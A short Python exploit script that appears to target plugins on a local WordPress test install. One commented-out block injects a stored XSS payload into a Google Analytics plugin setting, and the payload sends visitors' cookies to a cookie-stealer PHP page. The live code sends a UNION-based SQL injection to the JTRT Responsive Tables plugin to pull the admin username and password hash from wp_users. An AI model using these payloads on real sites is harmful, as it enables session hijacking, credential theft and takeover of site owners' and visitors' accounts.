import requests

def pretty_print_POST(req):
    """
    At this point it is completely built and ready
    to be fired; it is "prepared".

    However pay attention at the formatting used in
    this function because it is programmed to be pretty
    printed and may differ from the actual request.
    """
    print('{}\n{}\r\n{}\r\n\r\n{}'.format(
        '-----------START-----------',
        req.method + ' ' + req.url,
        '\r\n'.join('{}: {}'.format(k, v) for k, v in req.headers.items()),
        req.body,
    ))

'''
#GOOGE ANALYTICS PLUGIN XSS
url = "http://localhost/wordpress/pagina-di-esempio/"
headers = {'content-type':'application/x-www-form-urlencoded','host':'localhost'}

attack_script = '<script type="text/javascript">'\
                'var loc = \'http://127.0.0.1/cStealer/cookieStealer.php?cookies=\';'\
                'loc = loc.concat(document.cookie);'\
                'document.location=loc;' \
                '</script>'


raw_data = 'sgcgoogleanalytic='+attack_script+'&sgcwebtools=&button=Save+Changes&action=savegooglecode'
response = requests.post(url, headers = headers , data = raw_data)
'''


#JTRT RESPONSIVE TABLES PLUGIN

url = "http://localhost/wordpress/wp-admin/admin-ajax.php?action=get_old_table"

#A LOGIN AS USER IS REQUESTED

headers = {'content-type':'application/x-www-form-urlencoded','host':'localhost'}

data = {"tableId":"1+UNION+SELECT+1,2,CONCAT(user_login,char(58),user_pass),4,5+FROM+wp_users+WHERE+ID=1"}

response = requests.post(url, headers = headers , data = data)
pretty_print_POST(response.request)





print(response.status_code)
print(response.text)





